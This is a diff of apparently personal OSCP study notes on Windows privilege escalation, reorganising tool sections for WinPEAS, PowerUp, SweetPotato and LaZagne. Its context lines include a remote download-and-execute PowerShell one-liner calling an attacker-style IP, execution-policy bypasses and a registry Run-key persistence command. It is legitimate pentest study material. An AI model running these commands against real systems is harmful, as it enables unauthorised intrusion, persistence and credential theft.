@@ -1,4 +1,9 @@
 # Automated Enumeration
+## PowerShell Tee 
+Useful for running these long-running enumeration programs -- writes output to file while allowing real-time review.
+```powershell
+| Tee-Object -FilePath "output.txt"
+```
 
 ## PrivescCheck (Source)
 ```
@@ -11,26 +16,10 @@ Supposedly cleaner output than WinPEAS
 powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
 ```
 
-## WinPEAS (Source)
-```
-https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
-```
-Fundamental for OSCP. Always run and read output thoroughly.
-
-## WinPEAS (Kali Source)
-```
-/usr/share/peass/winpeas/winPEASx64.exe
-```
-
-## PowerShell Tee 
-Useful for running WinPEAS -- writes output to file while allowing real-time review.
-```powershell
-| Tee-Object -FilePath "output.txt"
-```
-# Helpers
-Somewhere in between manual and automated tooling.
 
 ## PowerUp.ps1 (Source)
+Checks for privilege escalation vectors. **Offers cmdlets to also abuse vulnerabilities, but should be avoided on the OSCP, as they may be considered a violation of the no "auto-exploit" rule.**
+https://blog.certcube.com/powerup-cheatsheet/
 ```
 https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
 ```
@@ -39,6 +28,18 @@ https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/Pow
 ```powershell
 Invoke-AllChecks
 ```
+
+## WinPEAS (GitHub Source)
+Fundamental for OSCP. Always run and read output thoroughly.
+```
+https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
+```
+
+## WinPEAS (Kali Source)
+```
+/usr/share/peass/winpeas/winPEASx64.exe
+```
+
 
 # Manual Context Gathering
 
@@ -303,6 +304,7 @@ icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 
 ## SweetPotato (Source)
 First choice to due to coverage of wide range of Windows versions.
+Compile in Windows VM with Visual Studio.
 ```
 https://github.com/CCob/SweetPotato
 ```
@@ -353,9 +355,6 @@ reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v evil /t REG_SZ /d 
 ```
 
 ---
-
-## Methodology
-
 ### Enumeration Priority
 1. Run automated tools first (WinPEAS, PowerUp)
 2. Check current user privileges (whoami /priv)
@@ -386,7 +385,7 @@ reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v evil /t REG_SZ /d 
 - Registry credentials (VNC, auto-login)
 - Configuration files with passwords
 - Saved credentials (cmdkey /list)
-- https://github.com/AlessandroZ/LaZagne/releases
+- Insecurely Cached Credentials (https://github.com/AlessandroZ/LaZagne/releases)
 
 **Other Vectors:**
 - Writable scheduled tasks running as SYSTEM
@@ -407,33 +406,6 @@ reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v evil /t REG_SZ /d 
 **JuicyPotato (Older Windows):**
 - Works on Windows 7, 8, Server 2008, Server 2012
 - Requires specific CLSID for OS version
-
-### Windows Privilege Escalation Checklist
-
-**Phase 1 - Automated Enumeration:**
-- Run WinPEAS
-- Run PowerUp.ps1
-- Run Windows Exploit Suggester (on Kali)
-
-**Phase 2 - Token/Privilege Checks:**
-- Check whoami /priv for dangerous privileges
-- If SeImpersonatePrivilege: Use SweetPotato
-- If SeBackupPrivilege: Backup SAM/SYSTEM hives
-
-**Phase 3 - Service Enumeration:**
-- Check for unquoted service paths
-- Check service binary permissions
-- Check for weak service permissions
-
-**Phase 4 - Credential Hunting:**
-- Search PowerShell history
-- Search registry for credentials
-- Search filesystem for config files
-- Check for saved credentials
-
-**Phase 5 - Last Resort:**
-- Check for kernel exploits (risky)
-- Look for DLL hijacking opportunities
 
 ### Common Privilege Groups
 
@@ -461,12 +433,6 @@ powershell -ep bypass
 powershell -ExecutionPolicy Bypass -File script.ps1
 powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/script.ps1')"
 ```
-
-### Useful PowerShell Tools
-
-**PowerUp.ps1** - Privilege escalation enumeration
-**Sherlock.ps1** - Exploit suggester
-**Invoke-Mimikatz.ps1** - Credential dumping
 
 ### Resources
 - PowerSploit Framework: https://github.com/PowerShellMafia/PowerSploit
